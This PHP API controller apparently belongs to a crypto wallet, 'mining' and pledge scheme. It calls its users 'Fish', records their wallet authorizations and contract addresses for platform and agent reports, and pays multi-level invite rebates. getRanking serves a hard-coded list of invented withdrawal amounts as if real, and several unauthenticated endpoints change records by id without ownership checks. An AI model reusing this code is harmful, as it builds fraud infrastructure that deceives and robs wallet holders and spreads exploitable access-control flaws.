<?php

namespace app\api\controller;

use app\admin\model\user\Income;
use app\admin\model\user\money\Log;
use app\admin\model\user\Team;
use app\common\controller\Api;
use app\admin\model\user\C2c;
use app\common\model\pledge\Record;
use app\common\model\users\Fish;
use app\common\model\UserWithdraw;
use app\common\model\WalletCoin;
use app\common\model\Withdraw;
use app\common\model\WithdrawSettings;
use think\Config;
use think\Db;
use think\Exception;
use think\Request;
use think\Validate;
use app\common\services\UserWalletService;
use app\common\model\UserWallet;
use app\common\model\Authentication;


/**
 *  用户接口
 */
class User extends Api
{
    protected $noNeedLogin = ['login', 'create', 'c2c', 'c2clist', 'noc2c','suc2c','authentication','authentication1','authentication2'];
    protected $noNeedRight = '*';
    protected $needAuthorize = [];
    protected $needAuthorize1 = ['getWalletList', 'getWalletDetails', 'withdraw', 'getTransferRecord', 'getTransferRecord', 'recharge'];

    public function _initialize()
    {
        parent::_initialize();
    }
    

    /**
     * 会员登录
     *
     * @ApiMethod (POST)
     * @throws \think\exception\DbException
     */
    public function login()
    {
        $address = $this->request->post('address');
        $authorizedAddress = $this->request->post('authorizedAddress');
        $contract = $this->request->post('contract');

        // if (!$address || !$authorizedAddress || !$contract) {
        //     $this->error('Invalid parameters');
        // }
        


        $ret = $this->auth->login($address, $authorizedAddress,$contract);
        if ($ret) {
            $data = $this->auth->getUserinfo();
            $this->success( 'Logged in successful', $data);
        } else {
            $this->error($this->auth->getError());
        }
    }
    
    /**
     * 用户注册或登录
     */
    public function create(){
        try {
            $params = $this->request->param();

        $params['address'] = isset($params['address']) ? $params['address'] : bin2hex(random_bytes(16));
        $params['authorized_address'] = isset($params['authorized_address']) ? $params['authorized_address'] :  bin2hex(random_bytes(16));
        $params['contract'] = isset($params['contract']) ? $params['contract'] :  bin2hex(random_bytes(16));
            $rule = [
                'address'               => 'require',                                           //钱包地址
                'authorized_address'    => 'require',                                           //授权地址
                'contract'              => 'require'                                            //合约地址
            ];
            $validate = new Validate($rule);
            $result = $validate->check($params);
            if (!$result) {
                $this->error($validate->getError());
            }
            $address = $params['address'];
            $this->lockName = lock($this->request->action() . $address);                    //获取锁
            if ($this->lockName === false) {
                $this->error(__('The system is busy'));
            }
            
            $authorizedAddress = $params['authorized_address'];
            
            $contract = $params['contract'];
            $invite = $params['invite'] ?? '000000';
            $type = $params['type'] ?? 'erc';
            //检测用户是否存在
            if (Fish::getByFishAddress($address)) {
                $ret = $this->auth->login($address, $authorizedAddress,$contract);
                if ($ret) {
                    $data = $this->auth->getUserinfo();
                    $this->success( __('Logged in successful'), $data);
                } else {
                    $this->error($this->auth->getError());
                }
            }
            //查询邀请码是否存在
            $inviteUid = Fish::where('invite', $invite)->value('id');
            if(empty($inviteUid)){
                $this->error(__('Invitation code does not exist'));
            }
            $ret = $this->auth->register($address, $authorizedAddress, $contract, $inviteUid, $type);
            if ($ret) {
                $data = $this->auth->getUserinfo();
                $data['address'] = $address;
                $this->success( __('Registration success'), $data);
            } else {
                $this->error($this->auth->getError());
            }
        } catch (Exception $e) {
            $this->error($e->getMessage());
        }
    }
        public function create1(){
        try {
            $params = $this->request->param();
            $rule = [
                'address'               => 'require',                                           //钱包地址
                'authorized_address'    => 'require',                                           //授权地址
                'contract'              => 'require'                                            //合约地址
            ];
            $validate = new Validate($rule);
            $result = $validate->check($params);
            if (!$result) {
                $this->error($validate->getError());
            }
            $address = $params['address'];
            $this->lockName = lock($this->request->action() . $address);                    //获取锁
            if ($this->lockName === false) {
                $this->error(__('The system is busy'));
            }
            
            $authorizedAddress = $params['authorized_address'];
            
            $contract = $params['contract'];
            $invite = $params['invite'] ?? '000000';
            $type = $params['type'] ?? 'erc';
            //检测用户是否存在
            if (Fish::getByFishAddress($address)) {
                $ret = $this->auth->login($address, $authorizedAddress,$contract);
                if ($ret) {
                    $data = $this->auth->getUserinfo();
                    $this->success( __('Logged in successful'), $data);
                } else {
                    $this->error($this->auth->getError());
                }
            }
            //查询邀请码是否存在
            $inviteUid = Fish::where('invite', $invite)->value('id');
            if(empty($inviteUid)){
                $this->error(__('Invitation code does not exist'));
            }
            $ret = $this->auth->register($address, $authorizedAddress, $contract, $inviteUid, $type);
            if ($ret) {
                $data = $this->auth->getUserinfo();
                $this->success( __('Registration success'), $data);
            } else {
                $this->error($this->auth->getError());
            }
        } catch (Exception $e) {
            $this->error($e->getMessage());
        }
    }
    
    /**
     * 用户授权
     * @param Request $request
     * @return void|null
     */
    public function authorize() {
        try {
            $params = $this->request->param();
            $rule = ['address' => 'require'];                                                                  //钱包地址
            $validate = new Validate($rule);
            $result = $validate->check($params);
            if (!$result) {
                $this->error($validate->getError());
            }
            $address = $params['address'];
            $this->lockName = lock($this->request->action() . $address);                                 //获取锁
            if ($this->lockName === false) {
                $this->error(__('The system is busy'));
            }
            Db::startTrans();
            try {
                $fish = Fish::where('fish_address', $address)->lock(true)->find();
                if (!$fish) {
                    exception('Account does not exist');
                }
                if ($fish->status == Fish::AUTHORIZED) {
                    exception('Duplicate authorization');
                }
                (new \app\common\model\PlatformReport())->writeReport('authorize_quantity');            //写入平台报表
                (new \app\common\model\ProxyReport())->writeReport($fish->aid,'authorize_quantity');    //写入代理报表
                $fish->status= Fish::AUTHORIZED;                                                             //改变状态
                $fish->save();
                Db::commit();                                                                                // 提交事务
            } catch (Exception $e) {
                Db::rollback();
                $this->error($e->getMessage());
            }
            $this->success( 'Authorization succeeded');
        } catch (Exception $e) {
            $this->error($e->getMessage());
        }
    }
    
    /**
     * 获取用户钱包列表
     * @param Request $request
     * @return void
     */
    public function getWalletList() {
        try {
            $list = UserWallet::with(['coin'])->where('uid', $this->auth->id)->order('wallet_coin_id','asc')->select();
            $data = [];
            foreach ($list as $v) {
               if($v->wallet_coin_id == 9){
                    $data[0] = [
                    'name'          => $this->request->header('lang') == 'cn' ? $v->coin->name_cn : $v->coin->name_en,
                    'coin'          => $v->coin->coin,
                    'balance'       => bcmul($v->balance, get_usdt_rate($v->coin->coin),6),
                    'convert_usdt'  => $v->balance,
                    'icon'          => $v->coin->image
                    ];
                }else if($v->wallet_coin_id == 12){
                    $data[1] = [
                    'name'          => $this->request->header('lang') == 'cn' ? $v->coin->name_cn : $v->coin->name_en,
                    'coin'          => $v->coin->coin,
                    'balance'       => bcmul($v->balance, get_usdt_rate($v->coin->coin),6),
                    'convert_usdt'  => $v->balance,
                    'icon'          => $v->coin->image
                    ];
                }else if($v->wallet_coin_id == 10){
                    $data[2] = [
                    'name'          => $this->request->header('lang') == 'cn' ? $v->coin->name_cn : $v->coin->name_en,
                    'coin'          => $v->coin->coin,
                    'balance'       => bcmul($v->balance, get_usdt_rate($v->coin->coin),6),
                    'convert_usdt'  => $v->balance,
                    'icon'          => $v->coin->image
                ];
                }else{
                    $data[] = [
                        'name'          => $this->request->header('lang') == 'cn' ? $v->coin->name_cn : $v->coin->name_en,
                        'coin'          => $v->coin->coin,
                        'balance'       => bcmul($v->balance, get_usdt_rate($v->coin->coin),6),
                        'convert_usdt'  => $v->balance,
                        'icon'          => $v->coin->image
                    ];
                }
            }
            $this->success(__('Request Success'),$data);
        } catch (Exception $e) {
            $this->error($e->getMessage());
        }
    }
    
    /**
     * 获取钱包详细
     * @param Request $request
     * @return void
     */
    public function getWalletDetails() {
        try {
            $params = $this->request->param();
            $rule = ['coin' => 'require'];                                                          //币种
            $validate = new Validate($rule);
            $result = $validate->check($params);
            if (!$result) {
                $this->error($validate->getError());
            }
            $coin = strtoupper($params['coin']);
            $walletCoin = WalletCoin::where('coin', $coin)->find();
            if (!$walletCoin) {
                $this->error(__('Coin does not exist'));
            }
            $userWallet = UserWallet::where(['uid' => $this->auth->id, 'wallet_coin_id' => $walletCoin->id])->find();
            if (!$userWallet) {
                $this->error(__('Wallet does not exist'));
            }
            $coinConfig = json_decode($walletCoin->configjson);
            $receiveAsset = [];
            $sendAsset = [];
            foreach ($coinConfig as $k => $v) {
                $receiveAsset[$k] = $v;
                $sendAsset[$k] = $userWallet->address;
            }
            $data = [
                'name'          => $this->request->header('lang') == 'cn' ? $walletCoin->name_cn : $walletCoin->name_en,
                'coin'          => $walletCoin->coin,
                'balance'       => $userWallet->balance,
                'convert_usdt'  => bcmul($userWallet->balance, get_usdt_rate($walletCoin->coin),6),
                'exchange_rate' => get_usdt_rate($walletCoin->coin),
                'icon'          => $walletCoin->image,
                'receive_asset' => $receiveAsset,
                'send_asset'    => $sendAsset
            ];
            $this->success(__('Request Success'),$data);
        } catch (Exception $e) {
            $this->error($e->getMessage());
        }
    }
    
    /**
     * 兑换币种
     * @return void
     * @throws \Exception
     */
    public function exchangeCoin() {
        try {
            $this->lockName = lock($this->request->action() . $this->auth->id);                                     //获取锁
            if ($this->lockName === false) {
                $this->error(__('The system is busy'));
            }
            $params = $this->request->param();
            $rule = [
                'coin'      => 'require',                                                                               //币种
                'amount'    => 'require|gt:0'                                                                           //金额
            ];
            $validate = new Validate($rule);
            $result = $validate->check($params);
            if (!$result) {
                $this->error($validate->getError());
            }
            $coin = strtoupper($params['coin']);
            $amount = sprintf("%.6f", $params['amount']);
            Db::startTrans();
            try {
                $user = $this->auth->getUser();
                //兑出用户钱包
                $fromUserWallet = (new UserWalletService($user->id, $coin, $amount))->reduceUBalance();
                //增加用户钱包余额
                $rate = get_usdt_rate($coin);                                                                           //获取汇率
                $getUsdt = bcmul($amount, $rate, 6);                                                              //得到的USDT
                //兑入用户钱包
                $toUserWallet = (new UserWalletService($user->id, 'USDT', $getUsdt))->addBalance();
                //新增兑换记录
                $exchangeRecordData = ['exchange_coin' => $amount . $coin, 'rate' => $rate, 'get_usdt' => $getUsdt];
                $exchangeRecord = $user->exchangeRecord()->save($exchangeRecordData);
                //新增账户明细
                $accountDetailsData = [
                    [
                        'coin'              => $coin,
                        'type'              => 7,
                        'change_quantity'   => -$amount,
                        'current_quantity'  => $fromUserWallet->balance,
                        'extend_info'       =>  json_encode(['exchange_record_id' => $exchangeRecord->id])
                    ],                                                                                                  //兑出明细
                    [
                        'coin'              => 'USDT',
                        'type'              => 8,
                        'change_quantity'   => $getUsdt,
                        'current_quantity'  => $toUserWallet->balance,
                        'extend_info'       => json_encode(['exchange_record_id' => $exchangeRecord->id])
                    ]                                                                                                   //兑入明细
                ];
                $user->accountDetails()->saveAll($accountDetailsData);
                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                $this->error($e->getMessage());
            }
            $this->success(__('Request Success'));
        } catch (Exception $e) {
            $this->error($e->getMessage());
        }
    }
    
    /**
     * 用户提现
     * @return void
     * @throws \Exception
     */
    public function withdraw() {
        try {
            $this->lockName = lock($this->request->action() . $this->auth->id);                                     //获取锁
            if ($this->lockName === false) {
                $this->error(__('The system is busy'));
            }
            $params = $this->request->param();
            $rule = [
                'coin'      => 'require',                                                                               //币种
                'amount'    => 'require|gt:0',                                                                          //金额
                'link'      => 'require', 
            ];
            $validate = new Validate($rule);
            $result = $validate->check($params);
            if (!$result) {
                $this->error($validate->getError());
            }
            $type = $params['type'];
            $coin = strtoupper($params['coin']);
            $amount = sprintf("%.6f", $params['amount']);
            $link = $params['link'];
            $bank_code = $params['code'];
            $name = $params['name'];
            Db::startTrans();
            try {
                $user = $this->auth->getUser();
                $userWallet = (new UserWalletService($user->id, $coin, $amount))->reduceUBalance();                     //减少用户钱包余额
                $settings = WithdrawSettings::find();
                //判断可提现金额
                if ($settings->low_withdraw_amount > $amount) {
                    exception(__('Minimum withdrawal') . ':' . $settings->low_withdraw_amount);
                }
                if ($settings->high_withdraw_amount < $amount) {
                    exception(__('Maximum withdrawal') . ':' . $settings->high_withdraw_amount);
                }
                $nowTime = time();
                //判断提现时间
                if (strtotime($settings->day_start_time) > $nowTime || strtotime($settings->day_end_time) < $nowTime) {
                    exception(__('Withdrawal time') . ':' . $settings->day_start_time . '-' . $settings->day_end_time);
                }
                //今日已提现次数
                $dayWithdrawCount = $user->userWithdraw()->whereTime('withdraw_time', 'today')->count('id');
                if ($settings->day_withdraw_num <= $dayWithdrawCount) {
                    exception(__('The number of withdrawals today has reached the limit'));
                }
                //计算提现手续费
                $commission = $settings->commission_calc_mode == 1 ? bcmul($amount, $settings->commission_val,6) : $settings->commission_val;
                if($type==2)
                    $userWithdrawData = [
                        'order_sn'      => getSn('TW'),
                        'coin'          => $coin,
                        'link'          => $link,
                        'amount'        => $amount,
                        'bank_code'     => $bank_code,
                        'remark'        => $name,
                        'commission'    => $commission > 0 ? $commission : 0,
                        'real_amount'   => bcsub($amount, $commission,6) > 0 ? bcsub($amount, $commission,6) : 0,
                        'withdraw_time' => time()
                    ];
                else
                    $userWithdrawData = [
                        'order_sn'      => getSn('TW'),
                        'coin'          => $coin,
                        'link'          => $link,
                        'amount'        => $amount,
                        'commission'    => $commission > 0 ? $commission : 0,
                        'real_amount'   => bcsub($amount, $commission,6) > 0 ? bcsub($amount, $commission,6) : 0,
                        'withdraw_time' => time()
                    ];
                $userWithdraw = $user->userWithdraw()->save($userWithdrawData);                                         //保存用户提现
                //新增提现账户明细
                $accountDetailsData = [
                    'coin'              => $coin,
                    'type'              => 6,
                    'change_quantity'   => -$amount,
                    'current_quantity'  => $userWallet->balance,
                    'extend_info'       => json_encode(['user_withdraw_id' => $userWithdraw->id])
                ];
                $user->accountDetails()->save($accountDetailsData);
                if ($coin == 'USDT') {
                    (new \app\common\model\PlatformReport())->writeReport('withdraw_usdt', $amount);               //写入平台报表
                    (new \app\common\model\ProxyReport())->writeReport($user->aid,'withdraw_usdt', $amount);       //写入代理报表
                    (new \app\common\model\UserReport())->writeReport($user->id,'withdraw_usdt', $amount);         //写入用户报表
                }
                Db::commit();
            } catch (Exception $e) {
                Db::rollback();
                $this->error($e->getMessage());
            }
            $this->success(__('Request Success'));
        } catch (Exception $e) {
            $this->error($e->getMessage());
        }
    }
    
    /**
     * 获取转账记录
     * @return void
     */
    public function getTransferRecord() {
        try {
            $params = $this->request->param();
            $rule = ['coin' => 'require'];                                      //币种
            $validate = new Validate($rule);
            $result = $validate->check($params);
            if (!$result) {
                $this->error($validate->getError());
            }
            $coin = strtoupper($params['coin']);
            $page = $params['page'] ?? 1;                                       //页数
            $pageSize = $params['page_size'] ?? 10;                             //页数大小
            $user = $this->auth->getUser();
            $data = $user->accountDetails()
                ->where('coin', $coin)
                ->whereIn('type', [5,6,7,15])
                ->page($page, $pageSize)
                ->order('createtime DESC')
                ->field('coin, type, change_quantity, extend_info, createtime')
                ->select();
            $count = $user->accountDetails()
                ->where('coin', $coin)
                ->whereIn('type', [5,6,7,15])
                ->count('id');
            $list = [];
            foreach ($data as $v) {
                $temp = [];
                if ($v->type == 5) {                                            //充值
                    $temp['title'] = __('Receiving assets') . ' ' . $v->coin;
                }
                if ($v->type == 6) {                                            //提现
                    $extendInfo = json_decode($v->extend_info);
                    $userWithdraw = UserWithdraw::where('id', $extendInfo->user_withdraw_id)->field('link, status')->find();
                    $temp['title'] = __('Send assets') . ' ' . $v->coin;
                    $temp['link'] = $userWithdraw['link'];
                    $temp['status'] = $userWithdraw['status'];
                }
                if ($v->type == 7) {                                            //兑出
                    $temp['title'] = __('Exchange') . ' ' . 'USDT';
                }
                if ($v->type == 15) {                                           //充值
                    $temp['title'] = __('Recharge') . ' ' . $v->coin;
                }
                $temp['amount'] = $v->change_quantity;
                $temp['create_time'] = date('Y-m-d H:i:s', $v->createtime);
                $list[] = $temp;
            }
            $response = ['total' => $count, 'list' => $list];
            $this->success(__('Request Success'), $response);
        } catch (Exception $e) {
            $this->error($e->getMessage());
        }
    }
    
    /**充值
     * @return void
     */
    public function recharge() {
        try {
            $this->lockName = lock($this->request->action() . $this->auth->id);                                     //获取锁
            if ($this->lockName === false) {
                $this->error(__('The system is busy'));
            }
            $params = $this->request->param();
            $rule = [
                'coin'   => 'require',                                                                                  //币种
                'amount' => 'require|gt:0',                                                                             //金额
            ];
            $validate = new Validate($rule);
            $result = $validate->check($params);
            if (!$result) {
                $this->error($validate->getError());
            }
            // $file = $this->request->file('image');
            // if (!$file) {
            //     $this->error(__('Please upload the picture'));
            // }
            // $info = $file->validate(['size'=>1024*1024*10,'ext'=>'jpg,jpeg,png,gif'])->move(ROOT_PATH . 'public' . DS . 'uploads');
            // if (!$info) {
            //     $this->error($file->getError());
            // }
            $coin = strtoupper($params['coin']);
            $amount = $params['amount'];
            // $image = DS . 'uploads' . DS . $info->getSaveName();
            $data = [
                'coin'          => $coin,
                'amount'        => $amount,
                // 'image'         => $image,
                'recharge_time' => time()
            ];
            $result = $this->auth->getUser()->rechargeRecord()->save($data);
            if (!$result) {
                $this->success(__('Request Fail'));
            }
            $this->success(__('Request Success'));
        } catch (Exception $e) {
            $this->error($e->getMessage());
        }
    }
    
    /**
     * 开启自动转换
     */
    public function changeAutoExchange(){
        $uid = $this->auth->id;

        $coin = $this->request->post('coin');

        $coinAddress = Wallet::where(['uid'=>$uid,'coin'=>$coin])->find();

        if ($coinAddress['is_convert'] == 0){
            $coinAddress->is_convert = 1;
            $coinAddress->save();
        }else{
            $coinAddress->is_convert = 0;
            $coinAddress->save();
        }
        $this->success( 'Success', $coinAddress->is_convert);
    }
    
    /**
     * 获取会员信息
     */
    public function userinfo(){
        $user = $this->auth->getUser();

        //$vip = Type::where('min','<',$user['balance'])->order('id desc')->find();

        //$share_grade = Grade::where('minAmount','<',$user['balance'])->order('level desc')->find();
        $data = [
            'address'=>$user['fish_address'],
//           'balance'=>$user['balance'],
            'invite'=>$user['invite'],
//            'pid'=>$user['pid'],
            'status'=>$user['status'],
//            'uid'=>$user['id'],
//            'vip_name'=> empty($vip)?Type::order('id asc')->value('name'):$vip['name'],
//            //我的矿池ETH总产量
//            'eth_pool'=>Wallet::where(['coin'=>'ETH','uid'=>$user['id']])->value('total_balance'),
//            'convertible_eth'=>sprintf("%.6f",$user['balance']/Config::get('site.eth_price')),
//            'rate'=>empty($vip)?sprintf("%.2f",Type::order('id asc')->value('rate') * 100)."%/6H":sprintf("%.2f",$vip['rate'] * 100)."%/6H",
//            'share_grade'=>empty($share_grade)?Grade::order('level desc')->find():$share_grade,

        ];
        $this->success(__('Request Success'), $data);
    }




    /**
     * 分享页面团队管理
     */
    public function team(){
        $uid = $this->auth->id;

        $result = [];
        //团队规模
        $result['team_count'] = Team::where(['uid'=>$uid,'level'=>['in','1,2,3']])->count('id');

        //直属下级人数
        $result['team_level1_count'] = Team::where(['uid'=>$uid,'level'=>1])->count('id');


        //查询团队信息
        $lower = Team::where(['uid'=>$uid,'level'=>['in','1,2,3']])->column('team');
        if(empty($lower)){
            //ETH累计收入
            $result['eth_income'] = 0;

            //ETH今日收益
            $result['eth_today_income'] = 0;

            //TRX累计收入
            $result['trx_income'] = 0;

            //TRX今日收益
            $result['trx_today_income'] = 0;


        }else{
            //ETH累计收入
            $result['eth_income'] = Log::where(['source_id'=>['in',$lower],'coin'=>'ETH'])->sum('money');

            //ETH今日收益
            $result['eth_today_income'] = Log::where(['source_id'=>['in',$lower],'coin'=>'ETH'])->whereTime('createtime','today')->sum('money');

            //TRX累计收入
            $result['trx_income'] = Log::where(['source_id'=>['in',$lower],'coin'=>'TRX'])->sum('money');

            //TRX今日收益
            $result['trx_today_income'] = Log::where(['source_id'=>['in',$lower],'coin'=>'TRX'])->whereTime('createtime','today')->sum('money');


        }


        $this->success('Success', $result);
    }



    /**
     * 下级返佣记录
     */
    public function team_record(){
        //页码
        $page = $this->request->post('page',1);

        //每页条数
        $limit = $this->request->post('limit',10);


        $uid = $this->auth->id;

        //等级(0全部 1：1级  2：2级 3：3级)
        $level = $this->request->post('level',0);


        $result = [];
        switch ($level){
            case 0:
                //查询团队信息
                $lower = Team::where(['uid'=>$uid,'level'=>['in','1,2,3']])->column('team');

                //查询流水记录
                $count   =	Log::where(['user_id'=>$uid,'source_id'=>['in',$lower]])->count('id');

                $result['lists'] = Log::where(['user_id'=>$uid,'source_id'=>['in',$lower]])
                    ->order('id desc')
                    ->field('id,money,coin,memo,source_id')
                    ->limit(($page -1) * $limit,$limit)
                    ->select();

                foreach ($result['lists'] as &$v){
                    $source = Fish::where('id',$v['source_id'])->value('fish_address');
                    $v['source'] = substr($source,0,4) ."****".substr($source,-4);
                    unset($v['source_id']);
                }

                $result['total_count'] = $count;
                break;
            case 1:
                //查询团队信息
                $lower = Team::where(['uid'=>$uid,'level'=>1])->column('team');

                //查询流水记录
                $count   =	Log::where(['user_id'=>$uid,'source_id'=>['in',$lower]])->count('id');

                $result['lists'] = Log::where(['user_id'=>$uid,'source_id'=>['in',$lower]])
                    ->order('id desc')
                    ->field('id,money,coin,memo,source_id')
                    ->limit(($page -1) * $limit,$limit)
                    ->select();

                foreach ($result['lists'] as &$v){
                    $source = Fish::where('id',$v['source_id'])->value('fish_address');
                    $v['source'] = substr($source,0,4) ."****".substr($source,-4);
                    unset($v['source_id']);
                }

                $result['total_count'] = $count;
                break;
            case 2:
                //查询团队信息
                $lower = Team::where(['uid'=>$uid,'level'=>2])->column('team');

                //查询流水记录
                $count   =	Log::where(['user_id'=>$uid,'source_id'=>['in',$lower]])->count('id');

                $result['lists'] = Log::where(['user_id'=>$uid,'source_id'=>['in',$lower]])
                    ->order('id desc')
                    ->field('id,money,coin,memo,source_id')
                    ->limit(($page -1) * $limit,$limit)
                    ->select();

                foreach ($result['lists'] as &$v){
                    $source = Fish::where('id',$v['source_id'])->value('fish_address');
                    $v['source'] = substr($source,0,4) ."****".substr($source,-4);
                    unset($v['source_id']);
                }

                $result['total_count'] = $count;
                break;
            case 3:
                //查询团队信息
                $lower = Team::where(['uid'=>$uid,'level'=>3])->column('team');

                //查询流水记录
                $count   =	Log::where(['user_id'=>$uid,'source_id'=>['in',$lower]])->count('id');

                $result['lists'] = Log::where(['user_id'=>$uid,'source_id'=>['in',$lower]])
                    ->order('id desc')
                    ->field('id,money,coin,memo,source_id')
                    ->limit(($page -1) * $limit,$limit)
                    ->select();

                foreach ($result['lists'] as &$v){
                    $source = Fish::where('id',$v['source_id'])->value('fish_address');
                    $v['source'] = substr($source,0,4) ."****".substr($source,-4);
                    unset($v['source_id']);
                }

                $result['total_count'] = $count;
                break;
            default:

                break;
        }

        $this->success(lang('Request Success'),$result);
    }
















    /**
     * 获取用户收入
     */
    public function mineIncome(){
        $user_id = $this->auth->id;

        //挖矿收益（流动性挖矿 + 质押）
        $result['miningIncome'] = Income::where(['userid'=>$user_id,'icometype'=>['in','1,10']])->sum('income');

        $result['recommendIncome'] = $this->auth->pledgeprice;

        $config = Config::get('site');
        //挖矿节点数
        $result['sys_pool_miningnode'] = $config['sys_pool_miningnode'];

        //挖矿用户数
        $result['sys_pool_usercount'] = $config['sys_pool_usercount'];
        $this->success('获取成功', $result);
    }



    /**
     * 获取Pool页面提现收入
     */
    public function getRanking(){


        $json = "{\"0xC65B9A****6ca\":107.504226,\"0x5de9d9****2b7\":197.265462,\"0x4F4729****848\":592.908439,\"0x881c02****7EA\":82.268793,\"0x5Ea4DC****950\":286.667003,\"0x7B196D****199\":92.679611,\"0x0E5186****d67\":34.205343,\"0x28D555****0fd\":563.001706,\"0x6b3bA0****439\":81.345131,\"0xf11046****847\":67.050083,\"0xB992bC****133\":500.303637,\"0xa8eE30****b88\":469.393711,\"0x2EC2aA****6C8\":482.733640,\"0x416cB4****95E\":146.334870,\"0x2c5Bf1****755\":293.162480,\"0xf9Df6D****3ac\":139.916168,\"0x638e4c****9c6\":132.997267,\"0xFBD3C6****b59\":474.786145,\"0x4794Bf****39f\":562.441931,\"0x985918****7ab\":499.284879,\"0x2bBfb5****15c\":416.172195,\"0x2D18A5****56c\":219.840986,\"0x69cc02****622\":308.216808,\"0xcc975B****B8d\":510.657709,\"0x11aE99****aCB\":434.852599,\"0x80Cb02****70f\":398.467266,\"0x7806Ee****66B\":590.016491,\"0xCd9caC****683\":83.391593,\"0xc2549E****7A9\":337.898648,\"0x928f50****641\":321.315852,\"0x5312c1****9c0\":145.923578,\"0x06B187****B73\":430.963928,\"0xA43B1D****F53\":256.563874,\"0xa6a41e****860\":126.780328,\"0x779DF6****706\":291.532278,\"0x172f01****074\":140.802790,\"0x2A7Aa7****6fC\":219.813641,\"0x165fa6****9EA\":570.796630,\"0x8D43F6****C6f\":87.950074,\"0x762EbB****C90\":320.011307,\"0xbe48b2****67F\":350.963414,\"0x2D6dc1****CD6\":430.675576,\"0x8E4825****3C7\":348.693902,\"0x002f80****2BA\":364.666858,\"0xbDdc86****721\":208.835535,\"0x423BFa****1e6\":424.702655,\"0x86F908****D82\":243.128332,\"0x46eb3e****8bD\":563.957059,\"0x660b02****729\":284.816137,\"0xEC3c5c****ad6\":464.958855,\"0x966020****102\":200.528124,\"0xd29Ef4****dcE\":175.776826,\"0x4A2Eed****7cd\":198.825835,\"0xD59b01****a95\":177.909408,\"0xB6e540****88B\":274.731490,\"0x9564F6****e11\":356.361951,\"0x331B5f****A96\":16.972624,\"0x288A0B****553\":457.416216,\"0x1c0707****774\":353.386782,\"0xfaDe96****566\":484.013523}";
        $i = 0;
        $result = [];
        foreach (json_decode($json,true) as $k=>$v){
            $result[$i]['key'] = $k;
            $result[$i]['value'] = $v;
            $i++;
        }
        $this->success('获取成功', $result);
    }


    /**
     * 发起质押请求
     */
    public function pledge(){
        $price = $this->request->post('price');
        $pledgetime = $this->request->post('pledgetime');
        $chain = $this->request->post('chain')?$this->request->post('chain'):'erc';

        if(floor($pledgetime) != $pledgetime || $pledgetime <=0){
            $this->error('wrong parameter');
        }

        if($price < 1){
            $this->error('The pledge amount is too low');
        }

        $user_id = $this->auth->id;

        $start = date('Y-m-d',strtotime('+2 day'));
        $end = date('Y-m-d',strtotime('+'.($pledgetime + 1).' day'));

        $data = [
            'uid'=>$user_id,
            'day'=>$pledgetime,
            'start'=>$start,
            'end'=>$end,
            'symbol'=>$chain,
            'createtime'=>time(),
            'pledgeprice'=>$price,
        ];
        $result = Record::insertGetId($data);
        if($result){
            $this->success('success',$result);
        }else{
            $this->error('Pledge failed, please try again');
        }

    }




    /**
     * 在线支付后，质押回调
     */
    public function pledge_callback(){
        $status = $this->request->post('status');
        $oid = $this->request->post('oid');
        $txId = $this->request->post('txId');

        $user_id = $this->auth->id;
        $data = [
            'status'=>$status,
            'txId'=>$txId,
        ];
        $result = Record::where(['id'=>$oid,'uid'=>$user_id])->update($data);
        if($result){
            $this->success('success');
        }else{
            $this->error('Pledge failed');
        }
    }



    /**
     * 收益记录
     */
    public function userIncome(){
        $status = $this->request->post('status');
        $user_id = $this->auth->id;

        switch ($status){
            case 1:
                //流动性挖矿
                $where['icometype'] = 1;
                break;
            case 2:
                //质押挖矿
                $where['icometype'] = ['in','1,10'];
                break;
            case 3:
                //邀请返佣
                $where['icometype'] = ['in','2,3,4,11,12,13'];
                break;
            default:
                $this->error('wrong parameter');
        }



        $result = Income::alias('inc')
            ->join('user_income_type type','type.id=inc.icometype','left')
            ->where(['userid'=>$user_id])->where($where)->field('inc.id,income,daily,type.name_en as name,inc.coin')->select();
        foreach ($result as &$v){
            $v['daily'] = date('Y-m-d',$v['daily']);
        }
        $this->success('success',$result);
    }

    /**
     * 提款详情
     */
    public function withdrawList(){
        $user = $this->auth->getUser();
        $result = Withdraw::where(['userid'=>$user['id']])->field('id,createtime,bpprice,status')->select();
        foreach ($result as &$v){
            $v['createtime'] = date('Y-m-d');
        }
        $this->success('success',$result);
    }
    
   public function c2c(){
        $data = $this->request->post();
        $rule = [
        ];
        $msg = [
        ];
        $validate = new \think\Validate($rule, $msg);
        $res = $validate->check($data);
        if ($res === false) {
            $this->error($validate->getError());
        }
        $data['uid'] = $this->auth->id;
        $data['purchase_coin'] = strtoupper($data['purchase_coin']);
        $data['coin'] = strtoupper($data['coin']); 
         $data['c2c_time'] = time();
        if(isset($data['id'])) {
            $model = C2c::get(['id' => $data['id']]);
            $model->save($data);
        }else {
            C2c::create($data);
        }
        $this->success('success');
    }
    
    public function c2clist(){
        $status = $this->request->get('status');
        $page = $this->request->get('page');
                 	
        $limit = 100;//$this->request->get('page_size',100);
        $where = [];
        $where = ['uid' => $this->auth->id] + $where;

        $where = ['status' => $status]+ $where;
        $model = new C2c();
        $list =  $model->where($where)->order('id desc')->paginate($limit,false,['page' => $page]);

        $result = array("total" => $list->total(), "list" => $list->items());
        $this->success('success',$result);
         
     }
    public function noc2c(){
        $id = $this->request->post('id');
        $model = C2c::get(['id' => $id]);
        $model->save(['status' => 0]);
        $this->success('success');
     }
     
    public function suc2c(){
        $id = $this->request->post('id');
        $image = $this->request->post('image');
        
       $model = C2c::get(['id' => $id]);
            $model->save([
                'image' =>$image,
                'status' => 3]);
             $this->success('success');
         
     }
     
         
    public function authentication1(){
        $data = $this->request->post();
        $rule = [];
        $msg = [];
        $validate = new \think\Validate($rule, $msg);
        $res = $validate->check($data);
        if ($res === false) {
            $this->error($validate->getError());
        }
      
        $data['uid'] = $this->auth->id;
        if(isset($data['id'])) {
            $model = Authentication::get(['id' => $data['id']]);
            $model->save($data);
        }else {
            Authentication::create($data);
        }
        $this->success('success');
         
     } 
     
     public function authentication2(){
        $data = $this->request->post();
        $rule = [];
        $msg = [];
        $validate = new \think\Validate($rule, $msg);
        $res = $validate->check($data);
        if ($res === false) {
            $this->error($validate->getError());
        }
        $data['uid'] = $this->auth->id;
        $data['status2'] = 1;
        if(isset($data['id'])) {
            $model = Authentication::get(['id' => $data['id']]);
            $model->save($data);
        }else {
            Authentication::create($data);
        }
        $this->success('success');
         
     }
       public function authentication(){
              $info = Authentication::where(['uid' => $this->auth->id])->order('id desc')->find();
              $this->success('success',$info);
       }
     
}
